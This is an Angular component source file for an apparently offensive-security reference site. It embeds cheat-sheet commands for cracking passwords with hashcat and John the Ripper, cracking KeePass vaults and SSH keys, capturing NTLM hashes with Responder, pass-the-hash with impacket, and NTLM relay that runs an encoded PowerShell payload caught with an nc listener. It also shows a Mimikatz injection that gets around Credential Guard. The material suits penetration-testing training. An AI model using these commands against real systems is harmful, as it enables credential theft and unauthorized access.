import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

interface ReferenceCommandBlock {
  context: string;
  command: string;
}

interface ReferenceLink {
  label: string;
  route: string;
  queryParams?: Record<string, string>;
}

interface ReferenceSection {
  title: string;
  description: string;
  blocks: ReferenceCommandBlock[];
  links?: ReferenceLink[];
}

@Component({
  selector: 'app-password-cracking',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent, RouterLink],
  templateUrl: './password-cracking.html',
  styleUrl: './password-cracking.scss'
})
export class PasswordCrackingComponent implements OnInit {
  selectedSection = 'methodology';

  readonly sections: SectionIndexItem[] = [
    { id: 'methodology', label: 'Methodology & Keyspace', group: 'Workflow', important: true },
    { id: 'wordlist-mutation', label: 'Wordlist Mutation Rules', group: 'Workflow' },
    { id: 'john-the-ripper', label: 'John the Ripper Basics', group: 'Workflow' },
    { id: 'keepass', label: 'KeePass Databases', group: 'Offline Hashes' },
    { id: 'ssh-key', label: 'SSH Private Key Passphrase', group: 'Offline Hashes' },
    { id: 'ntlm-cracking', label: 'NTLM / Net-NTLMv2 Cracking', group: 'Windows Credentials', important: true },
    { id: 'pass-the-hash', label: 'Pass-the-Hash & Relay', group: 'Windows Credentials', important: true },
    { id: 'credential-guard', label: 'Windows Credential Guard', group: 'Windows Credentials' }
  ];

  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const section = params.get('section');
        if (section && this.sections.some(item => item.id === section)) {
          this.selectedSection = section;
        }
      });
  }

  selectSection(section: string): void {
    this.selectedSection = section;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { section },
      replaceUrl: true
    });
  }

  get currentSection(): ReferenceSection {
    return this.referenceSections[this.selectedSection] ?? this.referenceSections['methodology'];
  }

  readonly referenceSections: Record<string, ReferenceSection> = {
    methodology: {
      title: 'Cracking Methodology & Keyspace',
      description: 'Extract → identify → estimate feasibility → prepare the wordlist → attack. Estimate keyspace and hash rate before committing time to an attack.',
      blocks: [
        {
          context: 'Methodology · 1. Extract → 2. Identify → 3. Estimate → 4. Prepare wordlist → 5. Attack',
          command: `# Identify the hash type/format
hashid <HASH>

# Estimate keyspace and cracking time
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**8)"           # keyspace for an 8-char password
hashcat -b                           # benchmark CPU/GPU hash rate
python3 -c "print(916132832 / 134200000)"   # keyspace / hash-rate (CPU)

# Attack the hash
hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -r rules.rule`
        }
      ]
    },
    'wordlist-mutation': {
      title: 'Wordlist Mutation Rules',
      description: 'Mutate dictionaries with Hashcat rules to satisfy password-policy constraints without hand-editing wordlists.',
      blocks: [
        {
          context: 'Wordlist mutation rules (Hashcat)',
          command: `# Common rule operators: ^ prepend, $ append, c capitalize first letter
echo '$1' > demo.rule
hashcat -r demo.rule --stdout demo.txt     # preview mutated output

# Combine rules on one line (sequential) vs multiple lines (independent)
# "$1 c"  -> append number, then capitalize
# "$1\\nc" -> two separate variants

# Predefined rule sets
ls /usr/share/hashcat/rules/
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
        }
      ]
    },
    'john-the-ripper': {
      title: 'John the Ripper Basics',
      description: 'Core John the Ripper workflow: convert files to crackable hashes, auto-detect the format, crack with wordlists/rules, and manage long-running sessions.',
      blocks: [
        {
          context: 'Convert common file types into crackable hashes',
          command: `zip2john file.zip > hash.txt
ssh2john id_rsa > hash.txt
keepass2john db.kdbx > hash.txt
pdf2john file.pdf > hash.txt
office2john document.docx > hash.txt
rar2john file.rar > hash.txt`
        },
        {
          context: 'Basic cracking with a wordlist (auto-detects the hash format)',
          command: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show every password already cracked for this hash file
john --show hash.txt`
        },
        {
          context: 'Force a specific hash format when auto-detection is ambiguous',
          command: `john --list=formats | grep -i <KEYWORD>     # search for a supported format name
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=sha256crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
        },
        {
          context: 'Rule-based and incremental/mask attacks',
          command: `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hash.txt   # apply a predefined rule set
john --incremental hash.txt                                                # brute-force every character combination
john --mask='?u?l?l?l?l?d?d?d' hash.txt                                     # Capital + 4 lowercase + 3 digits`
        },
        {
          context: 'Session management for long cracking jobs',
          command: `john --session=mysession --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Ctrl+C to pause, then resume later:
john --restore=mysession`
        }
      ]
    },
    keepass: {
      title: 'KeePass Databases',
      description: 'Locate, format and crack an offline KeePass (.kdbx) vault to recover the master password.',
      blocks: [
        {
          context: 'KeePass database cracking · Hashcat',
          command: `Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

keepass2john Database.kdbx > keepass.hash
hashcat --help | grep -i keepass     # mode 13400
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
        },
        {
          context: 'KeePass database cracking · John the Ripper',
          command: `keepass2john Database.kdbx > keepass.hash
# Strip the leading "Database:" filename prefix John adds, then crack
sed -i 's/^Database://' keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
john --show keepass.hash`
        }
      ]
    },
    'ssh-key': {
      title: 'SSH Private Key Passphrase',
      description: 'Recover the passphrase protecting an SSH private key to enable authentication to a remote system.',
      blocks: [
        {
          context: 'SSH private key passphrase cracking · Hashcat',
          command: `ssh2john id_rsa > ssh.hash
hashcat -h | grep -i ssh
# 22911 -> OpenSSH $0$ / 22921 -> OpenSSH $6$ / 22931 -> OpenSSH $1$,$3$

hashcat -m 22921 ssh.hash wordlist.txt -r custom.rule --force`
        },
        {
          context: 'SSH private key passphrase cracking · John the Ripper (with a custom rule)',
          command: `ssh2john id_rsa > ssh.hash

# Define a custom rule (e.g. capitalize + append digits/specials) and register it
cat >> ssh.rule <<'EOF'
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
EOF
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
john --show ssh.hash`
        }
      ]
    },
    'ntlm-cracking': {
      title: 'NTLM / Net-NTLMv2 Cracking',
      description: 'Crack a local NTLM hash dumped from the SAM/LSASS, or capture and crack a Net-NTLMv2 challenge-response with Responder.',
      blocks: [
        {
          context: 'Cracking NTLM / Net-NTLMv2 hashes · Hashcat',
          command: `# Local NTLM hash (e.g. dumped via Mimikatz lsadump::sam)
echo <NTLM_HASH> > user.hash
hashcat --help | grep -i ntlm         # NTLM mode 1000
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Net-NTLMv2 captured with Responder
sudo responder -I <INTERFACE>
# Trigger auth from the target: dir \\\\<ATTACKER_IP>\\share
# Save the full "NTLMv2-SSP Hash" line to user.hash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt`
        },
        {
          context: 'Cracking NTLM / Net-NTLMv2 hashes · John the Ripper',
          command: `# Local NTLM hash
echo <NTLM_HASH> > user.hash
john --format=NT user.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=NT user.hash

# Net-NTLMv2 hash captured with Responder (format: user::DOMAIN:challenge:response:blob)
john --format=netntlmv2 user.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Domain cached credentials (MSCACHEV2 / mscash2, e.g. from an offline SAM/registry dump)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 hash.txt`
        }
      ]
    },
    'pass-the-hash': {
      title: 'Pass-the-Hash & Relay',
      description: 'Reuse a captured NTLM hash directly, or relay an in-flight Net-NTLMv2 authentication, without ever cracking the password.',
      blocks: [
        {
          context: 'Pass-the-Hash (NTLM, no cracking required)',
          command: `smbclient \\\\\\\\<TARGET_IP>\\\\share -U Administrator --pw-nt-hash <NTLM_HASH>

impacket-psexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>
impacket-wmiexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>`
        },
        {
          context: 'Relaying Net-NTLMv2 (ntlmrelayx)',
          command: `impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <BASE64_PAYLOAD>"

# Catch the result
nc -nvlp <PORT>
# Trigger auth from the victim: dir \\\\<ATTACKER_IP>\\share`
        }
      ]
    },
    'credential-guard': {
      title: 'Windows Credential Guard',
      description: 'Credential Guard isolates domain hashes from LSASS in VTL1, blocking direct Mimikatz extraction; a malicious SSP can still capture plaintext credentials on the next logon.',
      blocks: [
        {
          context: 'Windows Credential Guard (bypass + limitations)',
          command: `Get-ComputerInfo | Select-String 'CredentialGuard|DeviceGuard'
# When enabled, LSASS no longer exposes plaintext-recoverable domain hashes (isolated in VTL1 / LSAISO)

# Bypass: inject a malicious SSP to capture plaintext credentials on next logon
privilege::debug
misc::memssp
type C:\\Windows\\System32\\mimilsa.log`
        }
      ]
    }
  };
}
